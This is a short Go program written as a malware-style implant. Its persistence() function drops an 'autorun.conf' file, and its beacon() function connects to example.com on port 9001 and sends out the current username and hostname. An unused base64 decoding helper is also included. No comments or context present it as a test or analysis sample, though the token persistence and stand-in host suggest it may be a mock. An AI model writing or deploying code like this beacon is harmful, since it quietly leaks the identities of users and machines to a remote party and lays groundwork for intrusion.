package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/user"
)

func decodeString(s string) string {
	data, _ := base64.StdEncoding.DecodeString(s)
	return string(data)
}

func persistence() {
	f, _ := os.Create("autorun.conf")
	defer f.Close()
	f.WriteString("run=1\n")
}

func beacon() {
	conn, _ := net.Dial("tcp", "example.com:9001")
	defer conn.Close()
	user, _ := user.Current()
	hostname, _ := os.Hostname()
	info := fmt.Sprintf("user=%s host=%s", user.Username, hostname)
	conn.Write([]byte(info))
}

func main() {
	persistence()
	beacon()
	fmt.Println("Execution complete")
}
